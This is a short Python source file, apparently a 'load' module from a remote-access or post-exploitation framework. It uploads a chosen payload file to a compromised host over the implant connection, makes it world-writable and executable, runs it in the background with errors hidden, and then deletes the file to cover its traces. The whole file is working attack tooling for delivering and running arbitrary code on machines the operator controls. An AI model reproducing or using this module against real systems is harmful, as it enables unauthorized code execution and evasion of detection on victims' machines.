#!/usr/bin/env python3

from core.badges import badges
from core.transfer import transfer

class UnicornModule:
    def __init__(self, unicorn_handler):
        self.unicorn = unicorn_handler
        self.transfer = transfer(self.unicorn)
        self.badges = badges()

        self.name = "load"
        self.description = "Load custom payload."
        self.usage = "Usage: load <input_file> [argv]"
        self.type = "managing"
        self.args = 2

    def run(self, cmd_data):
        input_file = cmd_data.split(" ")[0]
        arguments = "".join(cmd_data.split(input_file)).strip()

        print(self.badges.G + "Sending payload...")

        self.transfer.upload(input_file, input_file)
        instructions = \
        "chmod 777 ./" + input_file + ";" + \
        "./" + input_file + " " + arguments + " 2>/dev/null &;" + \
        "rm ./" + input_file + "\n"
        print(self.badges.G + "Executing payload...")

        sended_command = []
        sended_command.append("load")
        sended_command.append(instructions)

        self.send(str(sended_command).encode("UTF-8"))
        payload_output = self.unicorn.recv().strip()
        print(payload_output.decode("UTF-8", "ignore"))
        print(self.badges.S + "Payload executed!")